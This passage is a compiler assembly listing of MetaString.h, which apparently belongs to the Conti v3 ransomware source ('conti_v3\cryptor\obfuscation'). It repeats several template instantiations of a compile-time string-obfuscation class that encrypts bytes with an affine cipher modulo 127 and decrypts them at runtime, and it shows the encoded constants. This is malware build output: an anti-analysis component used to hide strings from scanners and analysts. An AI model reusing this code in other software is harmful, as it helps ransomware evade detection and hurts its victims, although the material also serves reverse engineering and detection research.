  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3f	 mov	 BYTE PTR [rcx+1], 63	; 0000003fH
  00007	c6 41 02 70	 mov	 BYTE PTR [rcx+2], 112	; 00000070H
  0000b	c6 41 03 0b	 mov	 BYTE PTR [rcx+3], 11
  0000f	c6 41 04 70	 mov	 BYTE PTR [rcx+4], 112	; 00000070H
  00013	c6 41 05 3b	 mov	 BYTE PTR [rcx+5], 59	; 0000003bH
  00017	c6 41 06 70	 mov	 BYTE PTR [rcx+6], 112	; 00000070H
  0001b	c6 41 07 43	 mov	 BYTE PTR [rcx+7], 67	; 00000043H
  0001f	c6 41 08 70	 mov	 BYTE PTR [rcx+8], 112	; 00000070H
  00023	c6 41 09 70	 mov	 BYTE PTR [rcx+9], 112	; 00000070H
  00027	c6 41 0a 70	 mov	 BYTE PTR [rcx+10], 112	; 00000070H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EP@$0HA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<79,112,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 4b 00 00 00	 mov	 eax, 75			; 0000004bH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 1a	 imul	 ecx, eax, 26

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 53	 mov	 BYTE PTR [rcx+1], 83	; 00000053H
  00007	c6 41 02 4b	 mov	 BYTE PTR [rcx+2], 75	; 0000004bH
  0000b	c6 41 03 78	 mov	 BYTE PTR [rcx+3], 120	; 00000078H
  0000f	c6 41 04 4b	 mov	 BYTE PTR [rcx+4], 75	; 0000004bH
  00013	c6 41 05 25	 mov	 BYTE PTR [rcx+5], 37	; 00000025H
  00017	c6 41 06 4b	 mov	 BYTE PTR [rcx+6], 75	; 0000004bH
  0001b	c6 41 07 33	 mov	 BYTE PTR [rcx+7], 51	; 00000033H
  0001f	c6 41 08 4b	 mov	 BYTE PTR [rcx+8], 75	; 0000004bH
  00023	c6 41 09 4b	 mov	 BYTE PTR [rcx+9], 75	; 0000004bH
  00027	c6 41 0a 4b	 mov	 BYTE PTR [rcx+10], 75	; 0000004bH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0FD@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<83,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 42	 sub	 ecx, 66			; 00000042H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 5b	 mov	 BYTE PTR [rcx+1], 91	; 0000005bH
  00007	c6 41 02 42	 mov	 BYTE PTR [rcx+2], 66	; 00000042H
  0000b	c6 41 03 20	 mov	 BYTE PTR [rcx+3], 32	; 00000020H
  0000f	c6 41 04 42	 mov	 BYTE PTR [rcx+4], 66	; 00000042H
  00013	c6 41 05 6a	 mov	 BYTE PTR [rcx+5], 106	; 0000006aH
  00017	c6 41 06 42	 mov	 BYTE PTR [rcx+6], 66	; 00000042H
  0001b	c6 41 07 35	 mov	 BYTE PTR [rcx+7], 53	; 00000035H
  0001f	c6 41 08 42	 mov	 BYTE PTR [rcx+8], 66	; 00000042H
  00023	c6 41 09 42	 mov	 BYTE PTR [rcx+9], 66	; 00000042H
  00027	c6 41 0a 42	 mov	 BYTE PTR [rcx+10], 66	; 00000042H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<53,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 2b	 sub	 ecx, 43			; 0000002bH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 0f	 imul	 r8d, ecx, 15

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 3f	 mov	 BYTE PTR [rcx+1], 63	; 0000003fH
  00007	c6 41 02 2b	 mov	 BYTE PTR [rcx+2], 43	; 0000002bH
  0000b	c6 41 03 5c	 mov	 BYTE PTR [rcx+3], 92	; 0000005cH
  0000f	c6 41 04 2b	 mov	 BYTE PTR [rcx+4], 43	; 0000002bH
  00013	c6 41 05 3a	 mov	 BYTE PTR [rcx+5], 58	; 0000003aH
  00017	c6 41 06 2b	 mov	 BYTE PTR [rcx+6], 43	; 0000002bH
  0001b	c6 41 07 33	 mov	 BYTE PTR [rcx+7], 51	; 00000033H
  0001f	c6 41 08 2b	 mov	 BYTE PTR [rcx+8], 43	; 0000002bH
  00023	c6 41 09 2b	 mov	 BYTE PTR [rcx+9], 43	; 0000002bH
  00027	c6 41 0a 2b	 mov	 BYTE PTR [rcx+10], 43	; 0000002bH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BB@$0CL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<17,43,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 5a	 sub	 ecx, 90			; 0000005aH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 22	 imul	 r8d, ecx, 34		; 00000022H

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 36	 mov	 BYTE PTR [rcx+1], 54	; 00000036H
  00007	c6 41 02 5a	 mov	 BYTE PTR [rcx+2], 90	; 0000005aH
  0000b	c6 41 03 4e	 mov	 BYTE PTR [rcx+3], 78	; 0000004eH
  0000f	c6 41 04 5a	 mov	 BYTE PTR [rcx+4], 90	; 0000005aH
  00013	c6 41 05 3f	 mov	 BYTE PTR [rcx+5], 63	; 0000003fH
  00017	c6 41 06 5a	 mov	 BYTE PTR [rcx+6], 90	; 0000005aH
  0001b	c6 41 07 56	 mov	 BYTE PTR [rcx+7], 86	; 00000056H
  0001f	c6 41 08 5a	 mov	 BYTE PTR [rcx+8], 90	; 0000005aH
  00023	c6 41 09 5a	 mov	 BYTE PTR [rcx+9], 90	; 0000005aH
  00027	c6 41 0a 5a	 mov	 BYTE PTR [rcx+10], 90	; 0000005aH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0EH@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<71,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
